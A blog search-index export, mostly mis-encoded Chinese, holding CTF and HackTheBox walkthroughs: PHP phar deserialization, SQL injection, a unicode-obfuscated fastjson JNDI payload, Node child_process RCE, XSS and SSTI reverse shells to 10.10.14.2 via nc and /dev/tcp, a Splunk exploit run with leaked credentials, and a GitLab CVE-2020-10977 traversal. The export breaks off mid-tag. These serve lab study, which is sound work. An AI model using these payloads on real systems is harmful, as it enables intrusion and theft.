<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DASCTF</title>
      <link href="/2021/10/31/general/DASCTF/"/>
      <url>/2021/10/31/general/DASCTF/</url>
      
        <content type="html"><![CDATA[<p>å®¡è®¡æºç å‘ç°æœ‰å˜é‡è¦†ç›–æ¼æ´ï¼Œå¯ä»¥æŠŠtemplateè¦†ç›–ï¼Œé…åˆfile_get_contentsé€ æˆä»»æ„æ–‡ä»¶è¯»å–</p><p>å°è¯•è¯»template.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var[template][1]=template.php&amp;tp=1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pattern = <span class="string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;suffix = <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="keyword">$this</span>-&gt;pattern, <span class="keyword">$this</span>-&gt;content, <span class="variable">$matches</span>)!==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;content = preg_replace(<span class="keyword">$this</span>-&gt;pattern, $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;suffix)&gt;<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error suffix&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&#x27;/var/www/html/test/uploads/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . md5(<span class="keyword">$this</span>-&gt;content) . <span class="keyword">$this</span>-&gt;suffix;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your html file is in &quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾å¯ä»¥ä½¿ç”¨pharååºåˆ—åŒ–å†™æ–‡ä»¶</p><p>render()æ–¹æ³•ä¸­ä¼šæ­£åˆ™åŒ¹é…<code>&#123;&#123;&#125;&#125;</code>é‡Œå†…å®¹ï¼Œç„¶åå½“ä½œå…¨å±€å˜é‡ä½¿ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‰é¢çš„ä»»æ„å˜é‡è¦†ç›–å¯¹å‚æ•°è¿›è¡Œä¿®æ”¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pattern = <span class="string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;suffix = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="keyword">$this</span>-&gt;pattern, <span class="keyword">$this</span>-&gt;content, <span class="variable">$matches</span>)!==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;content = preg_replace(<span class="keyword">$this</span>-&gt;pattern, $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;suffix)&gt;<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error suffix&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&#x27;/var/www/html/uploads/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . md5(<span class="keyword">$this</span>-&gt;content) . <span class="keyword">$this</span>-&gt;suffix;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your html file is in &quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Template();</span><br><span class="line"><span class="variable">$a</span>-&gt;content=<span class="string">&quot;&lt;?php &#123;&#123;abc&#125;&#125; ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ å†è°ƒç”¨è§¦å‘ååºåˆ—åŒ–</p><p><img src="/2021/10/31/general/DASCTF/image-20201226131349024.png" alt="image-20201226131349024"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8.129.41.25:10305?var[template][1]=phar:///var/www/html/test/uploads/723ee8e952c6c25ff6277a2f95c77a08/d78ae792e3958c6c8da2e7a8f9de9391.html&amp;tp=1&amp;abc=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/DASCTF/image-20201226131314432.png" alt="image-20201226131314432"></p><p>æˆ‘ä»¬æˆåŠŸç”Ÿæˆäº†phpæ–‡ä»¶</p><p><img src="/2021/10/31/general/DASCTF/image-20201226131436427.png" alt="image-20201226131436427"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p>æˆ‘ä»¬ä¼ å…¥ä¸€å¥è¯æœ¨é©¬æˆåŠŸæ‹¿åˆ°flag</p><p><img src="/2021/10/31/general/DASCTF/image-20201226131624759.png" alt="image-20201226131624759"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vnctf2021</title>
      <link href="/2021/10/31/general/VNctf2021wp/"/>
      <url>/2021/10/31/general/VNctf2021wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p>æ˜¯ä¸€ä¸ªç”¨jså†™çš„å‰ç«¯å°æ¸¸æˆï¼Œç›´æ¥æ‰¾åˆ°åˆå§‹åŒ–çš„å‡½æ•°å°†ç”Ÿå‘½å’Œæ­¦å™¨è°ƒå¤§</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316150206190.png" alt="image-20210316150206190"></p><p>ç›´æ¥è°ƒç”¨åˆå§‹åŒ–å‡½æ•°Init()å’ŒNextLevel()å‡½æ•°è·³å…³ï¼Œé€šå…³å³å¯</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316150647294.png" alt="image-20210316150206190"></p><h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2><p>ç¬›å¡å°”ç§¯æ³¨å…¥ä»¥åŠfastjson RCE </p><p>è¿›å»ä»¥åæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæç¤ºæ•°æ®é‡ä¸å¤§</p><p>çŒœæµ‹æ˜¯sqlæ³¨å…¥ï¼Œfuzzä¸€ä¸‹</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316153519410.png" alt="image-20210316153519410"></p><p>æŠ¥é”™æ³¨å…¥ï¼Œæ—¶é—´æ³¨å…¥éƒ½è¢«ç¦äº†ï¼Œæœ€ç»ˆå°è¯•ç¬›å¡å°”ç§¯æ³¨å…¥æˆåŠŸ</p><p>payload</p><p><code>username=admin&amp;password=1&#39;and if((ascii(substr((select database(),1,1))&lt;200),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0);#</code></p><p>ç›¸åº”æ—¶é—´å¤§æ¦‚0.6sï¼Œæœ€ç»ˆè·‘å‡ºå¯†ç æˆåŠŸç™»é™†</p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€å¤„å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p><strong><img src="/2021/10/31/general/VNctf2021wp/image-20210316162413676.png" alt="image-20210316162413676"></strong></p><p>å°è¯•è¯»å–springbootçš„pom.xml</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316162558262.png" alt="image-20210316162558262"></p><p>çœ‹åˆ°äº†ä½¿ç”¨äº†fastjsonï¼Œå¹¶ä¸”è¯¥ç‰ˆæœ¬æœ‰RCE,å°è¯•åˆ©ç”¨</p><p>åˆ©ç”¨githubä¸Šå¸ˆå‚…çš„é¡¹ç›®</p><p><code>&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</code></p><p>å‘ç°æœ‰è¿‡æ»¤ï¼Œåæ¥å¤§å¸ˆå‚…è¯´å¯ä»¥unicodeç»•è¿‡ï¼Œç„¶åæ‰¾åˆ°Pç‰›æ˜Ÿçƒä¸Šçš„æ–‡ç« </p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316163016012.png" alt="image-20210316163016012"></p><p>å°†éƒ¨åˆ†å…³é”®è¯æ›¿æ¢unicodeç¼–ç </p><p>åˆ©ç”¨å¤§å¸ˆå‚…çš„é¡¹ç›®å³å¯å¼¹shell</p><p>é™„ä¸Šé“¾æ¥<code>https://github.com/CaijiOrz/fastjson-1.2.47-RCE</code></p><p>æœ€ç»ˆpayload</p><p><code>&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://106.15.250.31:1389/Exploit&quot;,&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;:true&#125;&#125;&#125;</code></p><h2 id="navie"><a href="#navie" class="headerlink" title="navie"></a>navie</h2><p>ä¸€é“jsé…åˆreé¢˜ï¼ŒwebğŸ¶å®åœ¨ä¸ä¼š</p><p>æºç å¥‰ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import express from &quot;express&quot;;</span><br><span class="line">import bindings from &quot;bindings&quot;;</span><br><span class="line">import &#123; fileURLToPath &#125; from &#x27;url&#x27;</span><br><span class="line">import path from &quot;path&quot;;</span><br><span class="line"></span><br><span class="line">import pkg from &#x27;expression-eval&#x27;;</span><br><span class="line">const &#123; eval: eval_, parse &#125; = pkg;</span><br><span class="line"></span><br><span class="line">const addon = bindings(&quot;addon&quot;);</span><br><span class="line"></span><br><span class="line">const file = fileURLToPath(import.meta.url);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; extended: true &#125;));</span><br><span class="line"></span><br><span class="line">app.use(express.static(&quot;static&quot;));</span><br><span class="line"></span><br><span class="line">app.use(&quot;/eval&quot;, (req, res) =&gt; &#123;</span><br><span class="line">  const e = req.body.e;</span><br><span class="line">  const code = req.body.code;</span><br><span class="line">  if (!e || !code) &#123;</span><br><span class="line">    res.send(&quot;wrong?&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  try &#123;</span><br><span class="line">    if (addon.verify(code)) &#123;</span><br><span class="line">      res.send(String(eval_(parse(e))));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      res.send(&quot;wrong?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    console.log(e)</span><br><span class="line">    res.send(&quot;wrong?&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(&quot;/source&quot;, (req, res) =&gt; &#123;</span><br><span class="line">  let p = req.query.path || file;</span><br><span class="line">  p = path.resolve(path.dirname(file), p);</span><br><span class="line">  if (p.includes(&quot;flag&quot;)) &#123;</span><br><span class="line">    res.send(&quot;no flag!&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    res.sendFile(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use((err, req, res, next) =&gt; &#123;</span><br><span class="line">  console.log(err)</span><br><span class="line">  res.redirect(&quot;index.html&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT || 80);</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å¯¼å…¥äº†ä¸€ä¸ªè‡ªå·±å†™çš„æ¨¡å—ï¼Œå¹¶ä¸”å¯ä»¥è¯»å–æ–‡ä»¶</p><p>å¹¶ä¸”è¯´æ˜é™æ€ç›®å½•ä¸ºstaticï¼Œå¯ä»¥å°è¯•è¯»å–binding.gyp</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316171820329.png" alt="image-20210316171820329"></p><p>æˆ–è€…å»è¯»è¿è¡Œçš„æœåŠ¡ä¹Ÿå¯ä»¥è¯»åˆ°</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316171950805.png" alt="image-20210316171950805"></p><p>æ€»ä¹‹æˆ‘ä»¬çŸ¥é“ç”Ÿæˆäº†ä¸€ä¸ªaddonæ¨¡å—ï¼Œå°è¯•å»è¯»addonæ¨¡å—</p><p>æŸ¥é˜…èµ„æ–™çŸ¥é“é»˜è®¤ä¼šåœ¨./build/Release/ä¸‹ç”Ÿæˆ.nodeæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯addon.node</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316172158973.png" alt="image-20210316172158973"></p><p>ä¸‹è½½ååç¼–è¯‘æ‹¿åˆ°code(ps:æˆ‘ä¸ä¼šğŸ¶)</p><p>åˆ©ç”¨constructoræ„é€ å‡½æ•°ï¼Œå¹¶åˆ©ç”¨importåŠ¨æ€å¯¼å…¥</p><p>å‘ç°å¹¶æ— æ³•å¼¹shellï¼Œåªèƒ½åˆ©ç”¨å†™å…¥æ–‡ä»¶è¯»</p><p>payload</p><p><code>e=(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(child_process=&gt;&#123;child_process.exec(&#39;cat /flag &gt; ./test &#39;)&#125;)&quot;)();&amp;code=yoshino-s_want_a_gf%2Cqq1735439536</code></p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316172827716.png" alt="image-20210316172827716"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docter</title>
      <link href="/2021/10/31/general/%5BHTB%5DDT/"/>
      <url>/2021/10/31/general/%5BHTB%5DDT/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/31/general/[HTB]DT/image-20201202204034122.png" alt="image-20201202204034122"></p><p>éœ€è¦æ·»åŠ ä¸€æ¡hosts</p><blockquote><p>10.10.10.209    doctors.htb</p></blockquote><p>é¦–å…ˆnmapæ‰«ä¸€æ³¢</p><p><img src="/2021/10/31/general/[HTB]DT/image-20201203172229375.png" alt="image-20201203172229375"></p><p>æœ‰ç™»å½•æ¡†ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç™»é™†ä¸Šæœ‰ä¸€ä¸ªç•™è¨€ç•Œé¢ï¼Œçœ‹å¤§ä½¬å¯ä»¥XSSåå¼¹shell(: </p><p>ps:æ¶‰åŠåˆ°æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†</p><p>åˆ©ç”¨çš„æ˜¯ncçš„<code>-e``-c</code>ï¼Œåªæœ‰åœ¨nc.traditionalç‰ˆæœ¬ä¸­æ‰æœ‰ï¼Œè€Œæ­£å¸¸çš„ubuntuå‘è¡Œç‰ˆæ˜¯nc.openbsd</p><p>ä¸å¸¦<code>-e``-c</code></p><p><img src="/2021/10/31/general/[HTB]DT/image-20201202205447400.png"></p><p><img src="/2021/10/31/general/[HTB]DT/image-20201202205525591.png" alt="image-20201202205525591"></p><p>åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.2/$(nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.14.2&#x27;$IFS&#x27;4444&#x27;)&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]DT/image-20201202210611483.png" alt="image-20201202210611483"></p><p><img src="/2021/10/31/general/[HTB]DT/image-20201202210655333.png" alt="image-20201202210655333"></p><p>æˆåŠŸå¼¹åˆ°shellï¼Œå¯ä»¥ç”¨pythonå»ºç«‹ä¸€ä¸ªä¼ªç»ˆç«¯</p><p><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>çœ‹å¤§ä½¬è¿˜å¯ä»¥ç”¨ssti</p><p>åœ¨<code>/archive</code>é¡µé¢å¯ä»¥è§¦å‘</p><p><img src="/2021/10/31/general/[HTB]DT/image-20201203155607423.png" alt="image-20201203155607423"></p><p>åŒæ ·å¯ä»¥åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;system&#x27;](&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#x27;&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç™»é™†ä¸Šåæˆ‘ä»¬æ˜¯æ™®é€šç”¨æˆ·æƒé™</p><p>å»homeä¸‹è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·shaun</p><p>åœ¨/var/log/apache2ä¸‹é¢æœ‰ä¸ªbackupï¼Œåœ¨é‡Œé¢å‘ç°é‡ç½®å¯†ç æµé‡ï¼Œå°è¯•ç™»å½•</p><p><img src="/2021/10/31/general/[HTB]DT/image-20201203170240804.png" alt="image-20201203170240804"></p><p>ç™»é™†æˆåŠŸï¼Œä½†è¿˜æ˜¯æ™®é€šç”¨æˆ·æƒé™ï¼Œæ— æœ</p><p>å¼€å§‹nmapæ‰«å‡ºäº†8089æœ‰ä¸ªsplunkdæœåŠ¡</p><p>é€šè¿‡Splunké”™è¯¯é…ç½®ï¼Œå¯ä»¥è¿›è¡Œæœ¬åœ°ææƒæˆ–è¿œç¨‹æ‰§è¡Œä»£ç </p><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨è·å¾—çš„è´¦æˆ·å’Œå¯†ç æ¥åå¼¹shellï¼Œé™„ä¸Š<a href="https://github.com/falipan/SplunkWhisperer2">githubé¡¹ç›®</a></p><p>æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.2 --username shaun --password Guitar123 --payload &quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]DT/image-20201203195145214.png" alt="image-20201203195145214"></p><p>è¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†rootç”¨æˆ·</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laboratory</title>
      <link href="/2021/10/31/general/%5BHTB%5DLaboratory/"/>
      <url>/2021/10/31/general/%5BHTB%5DLaboratory/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201208214932228.png" alt="image-20201208214932228"></p><p>ä¸Šæ‰‹nmapå…ˆæ‰«ä¸€æ³¢</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210092255794-5674436.png" alt="image-20201210092255794"></p><p>æœ‰ä¸ªwebæœåŠ¡,å¯ä»¥çœ‹åˆ°443ç«¯å£DNSè§£æåˆ°git.laboratory.htb</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨hostsæ·»åŠ ä¸€æ¡</p><p>è®¿é—®git.laboratory.htbï¼Œå‘ç°æ˜¯ä¸€ä¸ªgitlab</p><p>åˆ©ç”¨CVE-2020-10977å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ä»¥åŠrce</p><h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><p>[CVE-2020-10977]](<a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a>)</p><p>ä»»æ„åˆ›å»ºä¸¤ä¸ªé¡¹ç›®ï¼Œå¹¶åœ¨å…¶ä¸­ä¸€ä¸ªæäº¤ä¸€ä¸ªæ–°çš„issues</p><p><code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)</code></p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210093356128.png"></p><p>å¹¶åœ¨å…¶ä¸­æ¨ªå‘ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä»“åº“ï¼Œå³å¯è§¦å‘æ¼æ´</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210093620987.png" 